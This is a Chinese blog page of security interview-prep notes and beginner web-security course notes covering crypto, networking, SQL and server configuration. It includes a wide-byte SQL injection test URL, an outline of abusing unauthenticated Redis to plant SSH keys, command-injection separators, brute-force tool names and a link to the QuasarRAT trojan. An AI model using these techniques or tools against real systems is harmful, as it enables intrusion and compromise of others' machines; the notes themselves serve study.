curl -k https://iot.mi.com/ -d xxx	</span><br><span class="line">C、	libcurl (CURLOPT_SSL_VERIFYPEER / CURLOPT_SSL_VERIFYPEER = false)</span><br><span class="line"></span><br><span class="line">float f = 1.1f		有点默认double 其他类型正常</span><br><span class="line"></span><br><span class="line">加密算法</span><br><span class="line">	可逆</span><br><span class="line">		对称</span><br><span class="line">			DES 密钥默认56位</span><br><span class="line">			3DES 密钥默认168 128</span><br><span class="line">			AES	DES进阶版	密钥默认128 196 256位</span><br><span class="line">		非对称</span><br><span class="line">			RSA密钥默认至少500位 一般推荐1024位</span><br><span class="line">	不可逆</span><br><span class="line">		常见的不可逆加密算法有MD5（信息摘要算法），HMAC，SHA1、SHA-224、SHA（安全散列算法）-256、SHA-384，和SHA-512，其中SHA-224、SHA-256、SHA-384，和SHA-512我们可以统称为SHA2加密算法，SHA加密算法的安全性要比MD5更高，而SHA2加密算法比SHA1的要高。其中SHA后面的数字表示的是加密后的字符串长度，SHA1默认会产生一个160位的信息摘要。</span><br><span class="line">		HMAC是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，由H.Krawezyk，M.Bellare，R.Canetti于1996年提出的一种基于Hash函数和密钥进行消息认证的方法，并于1997年作为RFC2104被公布，并在IPSec和其他网络协议（如SSL）中得以广泛应用，现在已经成为事实上的Internet安全标准。它可以与任何迭代散列函数捆绑使用。</span><br><span class="line">	</span><br><span class="line">redis mysql端口服务可能命令执行</span><br><span class="line">rsync是linux系统下的数据镜像备份工具。使用快速增量备份工具Remote Sync可以远程同步，支持本地复制，或者与其他SSH、rsync主机同步</span><br><span class="line"></span><br><span class="line">	对于301请求，搜索引擎或者浏览器都可以把跳转后的地址缓存下来，下一次不必发送这个请求</span><br><span class="line">	301代表永久性转移</span><br><span class="line">	302简单理解为该资源原本确实存在，但已经被临时改变了位置</span><br></pre></td></tr></table></figure>

<h1 id="nowcoder"><a href="#nowcoder" class="headerlink" title="nowcoder"></a>nowcoder</h1><h4 id="奇安信2020web安全工程师-5月31日"><a href="#奇安信2020web安全工程师-5月31日" class="headerlink" title="奇安信2020web安全工程师 5月31日"></a>奇安信2020web安全工程师 5月31日</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">chown	更改文件的所属都使用命令</span><br><span class="line">chgrp	变更文件与目录的所属群组</span><br><span class="line">set		设置所使用shell的执行方式，可依照不同的需求来做设置</span><br><span class="line"></span><br><span class="line">~/.ssh/id_rsa		600权限数字</span><br><span class="line"></span><br><span class="line">php关闭mysql数据库链接方法</span><br><span class="line">$conn-&gt;close();</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">$conn = null;</span><br><span class="line"></span><br><span class="line">$_FILES[&#x27;file&#x27;][&#x27;type&#x27;]</span><br><span class="line">1，前端判断上传文件的类型</span><br><span class="line">2，后端判断文件mime类型</span><br><span class="line">3，后端判断文件的后缀名</span><br><span class="line"></span><br><span class="line">宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</span><br><span class="line">php utf-8 mysql bgk</span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符</span><br><span class="line">mysql_escape_string() 转义一个字符串</span><br><span class="line">https://chinalover.sinaapp.com/SQL-GBK/?id=-1%df&#x27; and 1=1%23</span><br><span class="line">%df与/组成了一个汉字綅</span><br><span class="line">BGK为宽字节字符集，占用两个字节</span><br><span class="line">mysql中设置字符集方法为mysql_query(&quot;SET NAMES &#x27;gbk&#x27;&quot;, $conn)</span><br><span class="line">使用php函数addslashes()的时，会在引号的前面加上’\’变成%df\’</span><br><span class="line"></span><br><span class="line">xxe漏洞，可能造成的危害	ssrf攻击 任意文件读取 内网探测</span><br><span class="line">不能造成cookie盗取</span><br><span class="line"></span><br><span class="line">常见文件读取函数fopen() fgets() file_get_contents()</span><br><span class="line"></span><br><span class="line">跨域的解决方案CORS Websocket jsonp</span><br><span class="line"></span><br><span class="line">事务写入数据库的命令commit</span><br><span class="line"></span><br><span class="line">存储从三个到30个字符不等的产品名称使用VARCHAR(30)</span><br><span class="line">char和varchar区别</span><br><span class="line">1、最大长度：</span><br><span class="line">char最大长度是255字符，varchar最大长度是65535个字节。</span><br><span class="line">2、定长：</span><br><span class="line">char是定长的，不足的部分用隐藏空格填充，varchar是不定长的。</span><br><span class="line">3、空间使用：</span><br><span class="line">char会浪费空间，varchar会更加节省空间。</span><br><span class="line">4、查找效率：</span><br><span class="line">char查找效率会很高，varchar查找效率会更低。</span><br><span class="line">5、尾部空格：</span><br><span class="line">char插入时可省略，vaechar插入时不会省略，查找时省略。</span><br><span class="line">区别一，定长和变长</span><br><span class="line">char 表示定长，长度固定，varchar表示变长，即长度可变。char如果插入的长度小于定义长度时，则用空格填充；varchar小于定义长度时，还是按实际长度存储，插入多长就存多长。</span><br><span class="line">因为其长度固定，char的存取速度还是要比varchar要快得多，方便程序的存储与查找；但是char也为此付出的是空间的代价，因为其长度固定，所以会占据多余的空间，可谓是以空间换取时间效率。varchar则刚好相反，以时间换空间。</span><br><span class="line">区别之二，存储的容量不同</span><br><span class="line">对 char 来说，最多能存放的字符个数 255，和编码无关。</span><br><span class="line">而 varchar 呢，最多能存放 65532 个字符。varchar的最大有效长度由最大行大小和使用的字符集确定。整体最大长度是 65,532字节。</span><br><span class="line"></span><br><span class="line">考察知识点：TCP建立连接断开连接（三次握手四次挥手），客户端与服务端状态变化</span><br><span class="line">A：SYN_SENT是客户端发送SYN包之后的立即进入的状态，不用等待2ml</span><br><span class="line">B：服务端收到客户端的SYN包后会进入SYN_RCVD状态，服务端收到ACK包后会进入established状态。</span><br><span class="line">C： 当客户端处于ESTABLISHED状态时，服务端等待接收客户端的ACK，所以可能处于SYN_RCVD状态。</span><br><span class="line">D： 客户端收到服务端确认包后，等待2*ml时间后会直接关闭连接。若没有收到，则不会关闭连接。</span><br><span class="line"></span><br><span class="line">Nginx:nginx -s reload：reload 命令会重新加载配置文件，而nginx服务不会中断，服务启动，文件即加载成功。</span><br><span class="line"></span><br><span class="line">apache的默认配置文件是 httpd.conf</span><br><span class="line">apache在配置文件中添加 &lt;files&gt; Order Allow,Deny Deny from all &lt;/files&gt; 配置可以防止文件解析漏洞</span><br><span class="line"></span><br><span class="line">普通用户在使用非root权限的情况下，可以查看/etc/profile /etc/crontab</span><br><span class="line"></span><br><span class="line">命令执行漏洞攻击常用连接符 || | &amp; &amp;&amp;</span><br><span class="line"></span><br><span class="line">常见的内网端口转发工具Tunna sSocks proxychains</span><br><span class="line">foxproxy火狐代理插件</span><br><span class="line"></span><br><span class="line">ipv6报文头字段是版本号 流标签（flow label） 跳数限制</span><br><span class="line"></span><br><span class="line">路由协议 BGP OSPF RIP</span><br><span class="line">IGMP</span><br><span class="line">网路群组管理协议（英语：Internet Group Management Protocol，缩写：IGMP）是用于管理网路协议多播组成员的一种通信协议。IP主机和相邻的路由器利用IGMP来创建多播组的组成员。像ICMP用于单播连接一样，IGMP也是IP多播说明的一个完整部分。 IGMP为互联网协议的一种，属于开放系统链接(OSI) 模块的第三层协议，IP主机用它将主机的多点发送成员人数报告给临近的多点发送路由器。</span><br><span class="line"></span><br><span class="line">以下哪种措施可以达到防止扫描器扫描出漏洞的目的</span><br><span class="line">修改Web服务器的banner		即server信息</span><br><span class="line">在Web服务器前添加WAF</span><br><span class="line">过滤user-agent包含&quot;scanner&quot;的所有请求</span><br><span class="line"></span><br><span class="line">nginx的配置可能会威胁到其安全性</span><br><span class="line">fastcgi split path info ^(.+?\.php)(.*)$;</span><br><span class="line">fastcgi param PATH INFO $fastcgi path_info;</span><br></pre></td></tr></table></figure>

<h4 id="奇安信2020web安全工程师-4月21日"><a href="#奇安信2020web安全工程师-4月21日" class="headerlink" title="奇安信2020web安全工程师 4月21日"></a>奇安信2020web安全工程师 4月21日</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd		存系统用户名</span><br><span class="line">/etc/group		用户组配置文件</span><br><span class="line">/etc/profile	系统的每个用户设置环境变量信息</span><br><span class="line"></span><br><span class="line">hashcat		对Linux系统的密码文件进行安全审计</span><br><span class="line">Medusa		登录暴力破解器</span><br><span class="line">Hydra		暴力破解密码工具</span><br><span class="line"></span><br><span class="line">PHP的8大魔术常量：_class_, _line_, _namespace_, _function_, _file_, _dir_, _trait_,_method_</span><br><span class="line"></span><br><span class="line">Redis未设置密码可导致未授权访问漏洞</span><br><span class="line">使用root账号启用Redis服务，可能导致反弹ssh shell</span><br><span class="line">Redis默认开放端口是6379</span><br><span class="line">Redis设置acl访问后，依旧可能遭到攻击</span><br><span class="line">Redis6版本推出了ACL(Access Control List)访问控制权限的功能，基于此功能，我们可以设置多个用户，并且给每个用户单独设置命令权限和数据权限</span><br><span class="line"></span><br><span class="line">SQL中使用不等于运算符时，会自动过滤掉null值</span><br><span class="line">select * from student where SEX IS NOT NULL</span><br><span class="line">SELECT * from student where SEX&lt;&gt;&#x27;M&#x27;</span><br><span class="line">SELECT * from student where SEX=&#x27;M&#x27;</span><br><span class="line">select * from student where SEX is NULL</span><br><span class="line"></span><br><span class="line">icmpv4功能：</span><br><span class="line">    差错报告</span><br><span class="line">    主机存活诊断</span><br><span class="line">    路由重定向</span><br><span class="line"></span><br><span class="line">SNMP协议：简单网络管理协议，工作在UDP161端口 udp不面向连接</span><br><span class="line">OSI七层模型 TCP/IP协议</span><br><span class="line">应用层	网络服务与最终用户的一个接口</span><br><span class="line">	HTTP FTP TFTP SMTP SNMP DNS TELNET HTTPS POPS DHCP</span><br><span class="line">表示层	数据表示、安全、压缩</span><br><span class="line">会话层	建立、管理、终止会话</span><br><span class="line">    传输层	定已传输数据的协议端口号，以及留空和差错校验</span><br><span class="line">        TCP UDP</span><br><span class="line">        网络层	进行逻辑寻址，实现网络之间的路径选择</span><br><span class="line">            ICMP IGMP IP（IPv4 IPv6）</span><br><span class="line">            数据链路层	建立逻辑连接、进行硬件地址寻址、差错校验等功能</span><br><span class="line">            物理层	建立、维护、断开物理连接</span><br><span class="line"></span><br><span class="line">vlan（Virtual Local Area Network）的主要作用</span><br><span class="line">	提高网络设计灵活性</span><br><span class="line">	简化网络管理</span><br><span class="line">	保证网络安全</span><br><span class="line">	</span><br><span class="line">IIS任意文件上传漏洞</span><br><span class="line">	服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传</span><br><span class="line"></span><br><span class="line">允许某IP访问服务器的MySQL服务 family=ipv4</span><br><span class="line">firewall-cmd --permanent --add-rich-rule=&quot;rule family=ipv4 source address=&quot;10.110.74.248&quot; port port=&quot;3306&quot; protocol=tcp  accept&quot;</span><br><span class="line">iptables -A INPUT -p tcp -s 192.168.1.66 --dport 3306 -j ACCEPT</span><br><span class="line">-s 表示匹配源ip</span><br><span class="line"></span><br><span class="line">点击劫持（ClickJacking）</span><br><span class="line">点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的，不可见的iframe，覆盖在一个网页上，然后诱导使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱导用户恰巧点击在iframe页面的一些功能性按键上</span><br><span class="line"></span><br><span class="line">php高危函数</span><br><span class="line">	shell_exec system passthru</span><br><span class="line">	exec(),chroot(),chown(),chgrp(),ini_set(),putenv()</span><br><span class="line"></span><br><span class="line">sql desc是descend 降序意思 ，asc 是ascend</span><br><span class="line">    Select * from [order details] Order by quantity asc</span><br><span class="line">	Select * from [order details] Order by quantity		默认升序</span><br><span class="line"></span><br><span class="line">IPv6的128位地址通常写成8组，每组为四个十六进制数的形式</span><br><span class="line">	CDCD:910A:2222:5498:8475:1111:3900:2020，如果几个连续段位的值都是0，那么这些0就可以简单的以::来表示，上述地址就可写成AD80::ABAA:0000:00C2:0002，这个只能用一次，上例中的ABAA后面的0000就不能再次简化。当然也可以在ABAA后面使用::</span><br><span class="line">IPv4映像地址</span><br><span class="line">比如::ffff:192.168.89.9，是0000:0000:0000:0000:0000:ffff:c0a8:5909的简化写法。IPv4映像地址布局如下：| 80bits |16 | 32bits |等价于0000···0000 | FFFF | IPv4 address |。</span><br><span class="line">IPv4兼容地址</span><br><span class="line">比如::192.168.89.9是0000:0000:0000:0000:0000:0000:c0a8:5909的简化写法。IPv4兼容地址布局如下：| 80bits |16 | 32bits |等价于0000···0000 | 0000 | IPv4 address |</span><br><span class="line"></span><br><span class="line">TCP的拥塞控制</span><br><span class="line">    TCP拥塞控制算法一般以丢包为网络进入拥塞状态的信号</span><br><span class="line">    Vegas，Reno，Cubic，BBR都是拥塞控制算法</span><br><span class="line"></span><br><span class="line">Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加***规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接***h服务器登录目标服务器。</span><br><span class="line">漏洞的产生条件有以下两点:</span><br><span class="line">(1) Redis绑定在0.0.0.0:6379,且没有进行添加***规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</span><br><span class="line">(2) 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</span><br></pre></td></tr></table></figure>

<h4 id="哔哩哔哩2021校园招聘信息安全领域方向笔试卷"><a href="#哔哩哔哩2021校园招聘信息安全领域方向笔试卷" class="headerlink" title="哔哩哔哩2021校园招聘信息安全领域方向笔试卷"></a>哔哩哔哩2021校园招聘信息安全领域方向笔试卷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">数学家冯·诺依曼提出了计算机制造的三个基本原则，即采用</span><br><span class="line">    二进制逻辑、</span><br><span class="line">    程序存储执行以及</span><br><span class="line">    计算机由五个部分组成（运算器、控制器、存储器、输入设备、输出设备），这套理论被称为冯·诺依曼体系结构</span><br><span class="line"></span><br><span class="line">域名 端口 协议 三者相同为同域</span><br><span class="line">    https://www.bilibili.com/video/</span><br><span class="line">    https://www.bilibili.com</span><br><span class="line"></span><br><span class="line">WAF是通过预设规则来拦截异常请求，例如，</span><br><span class="line">    1.xss payload中的敏感字符&lt; &gt;，和敏感语句script等</span><br><span class="line">    2.sql语句中敏感字符 ’ 和select等</span><br><span class="line">    以及.git泄露</span><br><span class="line">    不能拦截水平越权</span><br><span class="line"></span><br><span class="line">iptables：定义***过滤规则</span><br><span class="line">uname：显示系统信息</span><br><span class="line">getenforce：查看系统当前 SELinux 的工作模式</span><br><span class="line">pr：打印输出，将较大的文件分割成多个页面，并为每个页面添加标题</span><br><span class="line"></span><br><span class="line">nmap</span><br><span class="line">    -sS 代表的是tcp syn扫描</span><br><span class="line">    -sP 用于查看是否存在于网络中</span><br><span class="line"></span><br><span class="line">排序算法时间平均复杂度最小的是快速排序和归并排序</span><br><span class="line"></span><br><span class="line">2017版OWASP TOP 10新上榜</span><br><span class="line">    不安全的反序列化</span><br><span class="line">    不足的日志记录和监控</span><br><span class="line">    XXE</span><br><span class="line"></span><br><span class="line">遵循安全规范的HTTPs连接能确保</span><br><span class="line">    客户端所连接的服务器是受信的</span><br><span class="line">    所加载的页面不会被篡改</span><br><span class="line">    传输数据不会被中间人窃取</span><br><span class="line">    </span><br><span class="line">    对于查看用户订单https://bilibili.com/getorder?id=522064&amp;user=13791118424这个URL，可能引起的安全问题有哪些？</span><br><span class="line">    XSS			url别的参数填到返回的html</span><br><span class="line">    水平越权</span><br><span class="line">    SQL注入</span><br><span class="line"></span><br><span class="line">信息安全的三要素	保密性 完整性 可用性</span><br><span class="line"></span><br><span class="line">RCE 远程代码执行 or 远程任意代码执行</span><br><span class="line"></span><br><span class="line">syn flood是一种DDoS攻击的常见手法，其利用的是TCP三次握手中第 2 次的SYN Timeout机制缺陷</span><br><span class="line"></span><br><span class="line">判断一个IP地址是否为局域网地址的正则表达式</span><br><span class="line">A类地址：10.0.0.0 - 10.255.255.255</span><br><span class="line">B类地址：172.16.0.0 - 172.31.255.255</span><br><span class="line">C类地址：192.168.0.0 -192.168.255.255</span><br><span class="line">(127[.]0[.]0[.]1)|(10[.]\d&#123;1,3&#125;[.]\d&#123;1,3&#125;[.]\d&#123;1,3&#125;)|(172[.]((1[6-9])|(2\d)|(3[01]))[.]\d&#123;1,3&#125;[.]\d&#123;1,3&#125;)|(192[.]168[.]\d&#123;1,3&#125;[.]\d&#123;1,3&#125;)</span><br><span class="line">\d&#123;1,3&#125;不能判断它是一个ip地址 假设他是一个ip地址的情况这个是对的</span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/" data-id="cljpcwhu3000bl8ezazttb2c9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-小迪2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E5%B0%8F%E8%BF%AA2020/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.345Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">总目录</span><br><span class="line">	https://mp.weixin.qq.com/s/t3mW_1akFSzlHJEKVhSdaQ</span><br></pre></td></tr></table></figure>

<h3 id="day01-基础入门-概念名词"><a href="#day01-基础入门-概念名词" class="headerlink" title="day01-基础入门 概念名词"></a>day01-基础入门 概念名词</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1.1	域名</span><br><span class="line">	二级域名 多级域名</span><br><span class="line">	baidu.com							顶级域名</span><br><span class="line">    news.baidu.com	www.baidu.com		二级域名</span><br><span class="line">    inurl:news.baidu.com搜索多级域名		share.news.baidu.com</span><br><span class="line">    域名发现对于安全测试的意义</span><br><span class="line">1.2	DNS	Domain Name System		域名和IP地址的相互转换</span><br><span class="line">	HOSTS与DNS的关系</span><br><span class="line">		C:\Windows\System32\drivers\etc\hosts,这里改ip地址可以重定向，域名劫持</span><br><span class="line">			此处改1.2.3.4	www.xiaodi8.com再ping会访问1.2.3.4</span><br><span class="line">	CDN CDN与DNS关系</span><br><span class="line">		百度搜超级ping，ping www.youku.com会发现不同位置解析的ip不同，CDN就是说访问一个远的ip地址会慢，在用户周围会提供缓存的节点（比如移动cdn，联通cdn），这样可以提升响应速度</span><br><span class="line">	常见DNS安全攻击</span><br><span class="line">		DNS劫持：放行审查范围以外的请求否则返回假的ip地址或什么都不做</span><br><span class="line">		缓存投毒	DNS 	DDOS攻击	域名劫持</span><br><span class="line">1.3	脚本语言</span><br><span class="line">	常用做网站</span><br><span class="line">		asp &quot;php&quot; aspx jsp &quot;javaweb&quot; pl py cgi action python的django等</span><br><span class="line">	不同脚本语言与安全漏洞的关系</span><br><span class="line">1.4	后门</span><br><span class="line">	什么是后门</span><br><span class="line">		1.绕过安全性控制而获取对程序或系统访问权的程序方法</span><br><span class="line">		2.开发阶段，程序员在软件内创建后门以便修改程序设计中的缺点</span><br><span class="line">	后门在安全测试中部分的实际意义</span><br><span class="line">		1.更方便的链接到主机</span><br><span class="line">		2.获取主机权限时，后门可以充当命令控制台的角色</span><br><span class="line">	玩法	免（查）杀</span><br><span class="line">1.5	WEB</span><br><span class="line">	组成架构</span><br><span class="line">		网站源码：分脚本类型，应用方向</span><br><span class="line">		操作系统</span><br><span class="line">		中间件	apache iis tomcat nginx</span><br><span class="line">		数据库 access mysql msssql oracle sybase postsql</span><br><span class="line">	为何以web层面为首</span><br><span class="line">		使用的比较广</span><br><span class="line">		漏洞相对较多</span><br><span class="line">		跳板深入到其他资源相对容易 提权</span><br><span class="line">1.6	WEB相关安全漏洞</span><br><span class="line">	WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</span><br><span class="line">    WEB 中间件对应漏洞：未授权访问，变量覆盖...</span><br><span class="line">    WEB 数据库对应漏洞：弱口令，权限提升...</span><br><span class="line">    WEB 系统层对应漏洞：提权，远程代码执行</span><br><span class="line">    其他第三方对应漏洞</span><br><span class="line">    APP 或 PC 应用结合类</span><br><span class="line">资源</span><br><span class="line">	http://www.xyaz.cn 								#逍遥安卓模拟器</span><br><span class="line">	http://www.downcc.com/soft/11196.html 			#wsexplorer网络抓包工具 v1.5 绿色中文版</span><br><span class="line">	https://github.com/quasar/QuasarRAT/releases 	#quasar exe木马</span><br><span class="line">	https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg提取码: 0b7b	#apk的逆向获取信息 漏了个大洞.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ping指令显示的ttl</span><br><span class="line">	云服务器上</span><br><span class="line">	ping localhost -c 1			#ttl=64 一般linux256是初值，windows是128，这个值可以改，windows在注册表[HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Tcpip\Parameters]	&quot;DefaultTTL&quot;=dword:000000ff</span><br><span class="line">	ping www.baidu.com -c 1		#ttl=53</span><br><span class="line">	说明途径64-53+1个路由器</span><br><span class="line">	linux traceroute</span><br><span class="line">	windows tracert</span><br><span class="line">演示案例</span><br><span class="line">    多级域名枚举查找（原理，方式）</span><br><span class="line">		1.百度搜索youku.com</span><br><span class="line">		2.用工具 前缀字典爆破		可以用burpsuite</span><br><span class="line">		3.第三方 域名注册商</span><br><span class="line">		4.查询A记录、MX记录、CNAME记录和NS记录</span><br><span class="line">    DNS解析修改后分析（本地或服务）</span><br><span class="line">		hosts文件添加1.2.3.4  www.xiaodi8.com</span><br><span class="line">    EXE后门功能及危害及类似WEB后门</span><br><span class="line">    APP类结合WEB协议，PC类结合WEB协议</span><br><span class="line">    	app逆向-》漏了个大洞-》apk文件</span><br><span class="line">    png TTL值</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1656771858190.png" alt="1656771858190"></p>
<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1656772025807.png" alt="1656772025807"></p>
